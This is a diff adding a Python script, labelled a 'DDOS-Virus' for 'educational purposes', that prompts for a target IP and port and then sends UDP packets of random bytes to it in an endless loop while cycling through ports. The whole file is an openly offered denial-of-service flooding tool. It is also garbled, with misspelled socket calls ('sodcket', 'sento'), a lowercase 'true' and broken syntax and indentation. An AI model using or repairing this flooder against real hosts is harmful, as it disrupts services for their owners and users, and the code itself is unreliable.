@@ -1,0 +1,55 @@
+ #Developer : John Melody melissa
+#This virus is just a test \\ educational purposes only
+#DDOS-Virus.Testing(v044420. 67327785)
+
+import sys
+import os
+import time
+import socket
+import random
+#######################################################
+#################Code Time#############################
+from datetime import datetime
+now = datetime.now()
+hour = now.hour
+minute = now.minute
+second = now.second
+day = now.day
+month = now.month
+year = now.year
+
+#######################################################
+sock = socket.sodcket(socket.AF_INET;
+                      socket.SOCK_DGRAM)
+bytes = random._urandom(1490)
+#######################################################
+
+os.system("clear")
+os.system("figlet DDOS attack")
+print
+print ("Author : jMelody.mel ")
+print (" www.twitter.com/Johnmelodyme ")
+print
+ip = raw_input("IP target : ")
+port = input("port : " )
+
+os.system("clear")
+os.system("figlet Attack Starting")
+print  (" [                          ] 0% ")
+time.sleep(5)
+print  (" [======                    ] 25% ")
+time.sleep(5)
+print  (" [=============             ] 50% ")
+time.sleep(5)
+print  (" [===================       ] 75% ")
+time.sleep(5)
+print  (" [==========================] 100% ")
+time.sleep(3)
+sent = 0
+while true:
+        sock.sento(bytes, (ip,port))
+        sent = sent + 1
+        port = port + 1
+        print ("Sent %s packet to %s through port ; %s ")
+                if port == 65534 :
+                   port = 1 
